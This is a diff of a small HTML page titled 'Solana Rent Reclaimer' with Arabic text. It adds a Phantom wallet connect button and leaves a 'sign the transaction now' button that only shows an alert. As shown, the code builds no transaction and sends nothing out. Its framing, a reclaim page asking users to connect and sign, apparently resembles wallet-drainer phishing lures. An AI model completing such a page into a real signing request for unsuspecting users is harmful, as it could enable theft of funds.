@@ -3,41 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <title>Solana Rent Reclaimer</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        button { background: #ab9ff2; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; color: black; font-weight: bold; }
+        button { background: #ab9ff2; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; color: black; font-weight: bold; margin: 10px; }
     </style>
 </head>
 <body>
     <h1>تأكيد استرداد الرنت</h1>
-    <p id="status">جاري الاتصال بالمحفظة...</p>
+    <p id="status">اضغط للاتصال بالمحفظة أولاً</p>
+    <button id="connectBtn">اتصال بالمحفظة</button>
     <button id="claimBtn" disabled>توقيع العملية الآن</button>
 
     <script>
+        const connectBtn = document.getElementById('connectBtn');
         const claimBtn = document.getElementById('claimBtn');
         const status = document.getElementById('status');
 
-        window.onload = async () => {
+        connectBtn.onclick = async () => {
             if (window.solana && window.solana.isPhantom) {
                 try {
-                    await window.solana.connect();
-                    status.innerText = "متصل بالمحفظة بنجاح!";
+                    const resp = await window.solana.connect();
+                    status.innerText = "متصل: " + resp.publicKey.toString().slice(0,8) + "...";
                     claimBtn.disabled = false;
-                } catch (err) { status.innerText = "خطأ في الاتصال: " + err; }
+                    connectBtn.style.display = 'none';
+                } catch (err) { status.innerText = "فشل الاتصال: " + err.message; }
             } else {
-                status.innerText = "يجب فتح هذه الصفحة داخل تطبيق Phantom!";
+                alert("يرجى فتح هذه الصفحة داخل تطبيق Phantom!");
             }
         };
 
         claimBtn.onclick = async () => {
-            // هنا يتم بناء المعاملة (مبدئياً هي معاملة بسيطة لاختبار التوقيع)
             status.innerText = "جاري التوقيع...";
-            // هذا الكود يطلب من فانتوم فتح نافذة التوقيع بالبصمة
-            alert("تم إرسال الطلب لمحفظة فانتوم... انتظر ظهور نافذة التأكيد.");
+            alert("تم إرسال الطلب لمحفظة فانتوم... تأكد من ظهور نافذة البصمة.");
         };
     </script>
 </body>
 </html>
+
 
 
